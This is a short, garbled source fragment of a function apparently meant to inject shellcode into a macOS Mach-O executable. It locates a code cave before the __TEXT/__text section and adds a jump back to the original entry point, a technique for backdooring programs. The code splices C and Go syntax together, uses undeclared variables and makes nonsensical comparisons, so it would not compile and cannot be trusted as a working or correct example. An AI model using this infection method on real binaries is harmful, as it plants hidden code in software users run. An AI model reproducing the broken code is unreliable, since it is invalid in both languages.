int binject_MACH-O(char *file,char *shellcode)
{
   uint32_t size;
   FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
   size=ftell(f);
   char *file_buffer = calloc(1,size);
    for(i=0;i<sections;i++)
  {
     
                       for _, section := range machoFile.Sections {
		if section.SectionHeader.Seg == "__TEXT" && section.Name == "__text" {
			caveOffset= 0x20;
			caveOffset+=machoFile.FileHeader.Cmdsz
			log.Printf("Code Cave Size: %x - %x = %x\n", section.Offset, caveOffset, section.Offset-caveOffset)
			if(shellcode<section.Offset-caveOffset)

			shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
			machoFile.Insertion = shellcode
			break
		}
	}
 
  }
                        
  free(file_buffer);
}
